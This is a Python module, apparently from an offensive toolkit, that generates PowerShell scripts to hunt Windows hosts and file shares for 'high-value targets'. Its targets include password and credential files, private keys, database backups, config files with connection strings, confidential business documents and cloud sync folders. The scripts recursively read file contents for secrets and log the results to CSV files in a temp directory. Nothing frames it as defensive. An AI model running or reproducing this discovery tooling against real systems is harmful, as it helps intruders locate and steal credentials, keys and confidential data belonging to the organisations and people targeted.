#!/usr/bin/env python3
"""
Sensitive Data Discovery Module
Locate high-value targets and intellectual property
"""

from typing import Dict, List
from dataclasses import dataclass


@dataclass
class SearchPattern:
    """Represents a sensitive data search pattern"""
    category: str
    description: str
    file_extensions: List[str]
    keywords: List[str]
    search_locations: List[str]


class SensitiveDataFinder:
    """
    Locate high-value targets
    Financial data, credentials, intellectual property
    """
    
    def __init__(self):
        """Initialize sensitive data finder"""
        self.patterns = self._initialize_patterns()
    
    def _initialize_patterns(self) -> List[SearchPattern]:
        """Initialize search patterns"""
        return [
            SearchPattern(
                category="financial",
                description="Financial documents and data",
                file_extensions=["*.xls*", "*.csv", "*.pdf"],
                keywords=["invoice", "payment", "salary", "budget", "financial", "revenue", "profit"],
                search_locations=[
                    "$env:USERPROFILE\\Documents",
                    "$env:USERPROFILE\\Desktop",
                    "C:\\Users\\*\\Documents",
                    "\\\\fileserver\\finance"
                ]
            ),
            
            SearchPattern(
                category="credentials",
                description="Password and credential files",
                file_extensions=["*.txt", "*.doc*", "*.xml", "*.config"],
                keywords=["password", "credential", "secret", "key", "token", "api", "auth"],
                search_locations=[
                    "$env:USERPROFILE\\Documents",
                    "$env:USERPROFILE\\Desktop",
                    "$env:USERPROFILE\\Downloads",
                    "C:\\Users\\*\\Documents"
                ]
            ),
            
            SearchPattern(
                category="database",
                description="Database files and backups",
                file_extensions=["*.mdb", "*.accdb", "*.sql", "*.db", "*.sqlite", "*.bak"],
                keywords=[],
                search_locations=[
                    "$env:USERPROFILE",
                    "C:\\Program Files\\*",
                    "C:\\inetpub\\*",
                    "\\\\fileserver\\*"
                ]
            ),
            
            SearchPattern(
                category="configuration",
                description="Configuration and settings files",
                file_extensions=["*.config", "*.xml", "*.ini", "*.conf", "*.yaml", "*.json"],
                keywords=["password", "connectionstring", "apikey", "secret"],
                search_locations=[
                    "C:\\inetpub\\*",
                    "C:\\Program Files\\*",
                    "$env:PROGRAMDATA",
                    "$env:APPDATA"
                ]
            ),
            
            SearchPattern(
                category="source_code",
                description="Source code with hardcoded secrets",
                file_extensions=["*.cs", "*.java", "*.py", "*.js", "*.php", "*.cpp", "*.c"],
                keywords=["TODO", "HACK", "XXX", "password", "apikey", "secret", "hardcoded"],
                search_locations=[
                    "$env:USERPROFILE\\source",
                    "$env:USERPROFILE\\projects",
                    "C:\\inetpub\\wwwroot",
                    "\\\\fileserver\\development"
                ]
            ),
            
            SearchPattern(
                category="certificates",
                description="Certificates and private keys",
                file_extensions=["*.pem", "*.key", "*.pfx", "*.p12", "*.cer", "*.crt"],
                keywords=[],
                search_locations=[
                    "$env:USERPROFILE",
                    "C:\\Program Files\\*",
                    "$env:APPDATA",
                    "$env:PROGRAMDATA"
                ]
            ),
            
            SearchPattern(
                category="backups",
                description="Backup files and archives",
                file_extensions=["*.bak", "*.backup", "*.old", "*.zip", "*.7z", "*.rar"],
                keywords=["backup", "archive", "dump"],
                search_locations=[
                    "$env:USERPROFILE",
                    "C:\\Backups",
                    "C:\\Temp",
                    "\\\\fileserver\\backups"
                ]
            ),
            
            SearchPattern(
                category="sensitive_docs",
                description="Sensitive business documents",
                file_extensions=["*.doc*", "*.pdf", "*.xls*", "*.ppt*"],
                keywords=["confidential", "secret", "internal", "proprietary", "restricted"],
                search_locations=[
                    "$env:USERPROFILE\\Documents",
                    "$env:USERPROFILE\\Desktop",
                    "C:\\Users\\*\\Documents",
                    "\\\\fileserver\\*"
                ]
            ),
            
            SearchPattern(
                category="cloud_sync",
                description="Cloud storage and sync folders",
                file_extensions=["*"],
                keywords=[],
                search_locations=[
                    "$env:USERPROFILE\\OneDrive",
                    "$env:USERPROFILE\\Dropbox",
                    "$env:USERPROFILE\\Google Drive",
                    "$env:USERPROFILE\\Box Sync"
                ]
            )
        ]
    
    def get_pattern_by_category(self, category: str) -> SearchPattern:
        """Get search pattern by category"""
        for pattern in self.patterns:
            if pattern.category.lower() == category.lower():
                return pattern
        return None
    
    def get_all_patterns(self) -> List[SearchPattern]:
        """Get all search patterns"""
        return self.patterns
    
    def generate_search_script(self, categories: List[str] = None) -> str:
        """
        Generate PowerShell script for sensitive data search
        
        Args:
            categories: Specific categories to search (None = all)
            
        Returns:
            PowerShell script for sensitive data discovery
        """
        if categories:
            patterns = [p for p in self.patterns if p.category in categories]
        else:
            patterns = self.patterns
        
        script = """# Sensitive Data Discovery Script
# Locate high-value targets and intellectual property

Write-Host "[*] Starting sensitive data search..."

# Create output directory
$outputDir = "$env:TEMP\\sensitive_data_$(Get-Date -Format 'yyyyMMdd_HHmmss')"
New-Item -ItemType Directory -Path $outputDir -Force | Out-Null

function Find-SensitiveFiles {
    param(
        [string]$Category,
        [array]$Extensions,
        [array]$Keywords,
        [array]$Locations
    )
    
    Write-Host "[*] Searching for: $Category"
    
    $results = @()
    
    foreach ($location in $Locations) {
        if (Test-Path $location -ErrorAction SilentlyContinue) {
            Write-Host "    Scanning: $location"
            
            try {
                $files = Get-ChildItem -Path $location -Include $Extensions -Recurse -ErrorAction SilentlyContinue -Force |
                    Select-Object -First 1000  # Limit results
                
                foreach ($file in $files) {
                    $match = $false
                    
                    # If keywords specified, search file content
                    if ($Keywords.Count -gt 0) {
                        try {
                            $content = Get-Content $file.FullName -ErrorAction SilentlyContinue
                            foreach ($keyword in $Keywords) {
                                if ($content -match $keyword) {
                                    $match = $true
                                    break
                                }
                            }
                        } catch {
                            # Binary file or access denied
                        }
                    } else {
                        # No keywords, file extension match is enough
                        $match = $true
                    }
                    
                    if ($match) {
                        $results += [PSCustomObject]@{
                            Path = $file.FullName
                            Size = $file.Length
                            LastModified = $file.LastWriteTime
                            Category = $Category
                        }
                    }
                }
            } catch {
                Write-Host "    [-] Error scanning $location"
            }
        }
    }
    
    return $results
}

"""
        
        # Add search for each pattern
        for pattern in patterns:
            extensions_str = ", ".join([f'"{ext}"' for ext in pattern.file_extensions])
            keywords_str = ", ".join([f'"{kw}"' for kw in pattern.keywords])
            locations_str = ", ".join([f'"{loc}"' for loc in pattern.search_locations])
            
            script += f"""
# Search for {pattern.description}
$results_{pattern.category} = Find-SensitiveFiles `
    -Category "{pattern.category}" `
    -Extensions @({extensions_str}) `
    -Keywords @({keywords_str}) `
    -Locations @({locations_str})

if ($results_{pattern.category}.Count -gt 0) {{
    Write-Host "[+] Found $($results_{pattern.category}.Count) {pattern.category} files"
    $results_{pattern.category} | Export-Csv "$outputDir\\{pattern.category}.csv" -NoTypeInformation
}}

"""
        
        script += """
# Combine all results
$allResults = @()
"""
        
        for pattern in patterns:
            script += f"$allResults += $results_{pattern.category}\n"
        
        script += """
# Save combined results
if ($allResults.Count -gt 0) {
    Write-Host "[+] Total files found: $($allResults.Count)"
    $allResults | Export-Csv "$outputDir\\all_findings.csv" -NoTypeInformation
    
    # Generate summary
    $summary = $allResults | Group-Object Category | Select-Object Name, Count
    Write-Host "`n[*] Summary by category:"
    $summary | ForEach-Object { Write-Host "    $($_.Name): $($_.Count)" }
    
    Write-Host "`n[*] Results saved to: $outputDir"
} else {
    Write-Host "[-] No sensitive files found"
}
"""
        
        return script
    
    def generate_targeted_search(self, file_pattern: str, keyword: str) -> str:
        """
        Generate script for targeted file search
        
        Args:
            file_pattern: File pattern to search for
            keyword: Keyword to search within files
            
        Returns:
            PowerShell script for targeted search
        """
        return f"""
Write-Host "[*] Targeted search: {file_pattern} containing '{keyword}'"

$searchPaths = @(
    "$env:USERPROFILE",
    "C:\\Users",
    "C:\\inetpub",
    "C:\\Program Files"
)

foreach ($path in $searchPaths) {{
    if (Test-Path $path) {{
        Write-Host "[*] Searching: $path"
        
        Get-ChildItem -Path $path -Filter "{file_pattern}" -Recurse -ErrorAction SilentlyContinue |
        ForEach-Object {{
            try {{
                $content = Get-Content $_.FullName -ErrorAction Stop
                if ($content -match "{keyword}") {{
                    Write-Host "[+] Match found: $($_.FullName)"
                    Write-Host "    Size: $($_.Length) bytes"
                    Write-Host "    Modified: $($_.LastWriteTime)"
                }}
            }} catch {{
                # Binary file or access denied
            }}
        }}
    }}
}}
"""
    
    def get_search_summary(self) -> Dict:
        """Get summary of search capabilities"""
        return {
            'total_categories': len(self.patterns),
            'categories': [p.category for p in self.patterns],
            'descriptions': {p.category: p.description for p in self.patterns}
        }
